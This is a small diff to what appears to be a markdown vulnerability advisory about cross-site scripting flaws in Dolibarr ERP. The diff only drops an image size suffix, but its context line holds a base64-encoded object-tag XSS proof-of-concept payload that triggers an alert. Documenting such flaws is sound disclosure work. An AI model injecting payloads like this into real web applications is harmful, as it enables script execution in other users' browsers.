@@ -15,4 +15,4 @@ Description: Multiple cross-site scripting (XSS) vulnerabilities in Dolibarr ERP
 
 # Payload : \<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>\</object>
 
-![Payload](payload.png =100x100)
+![Payload](payload.png)
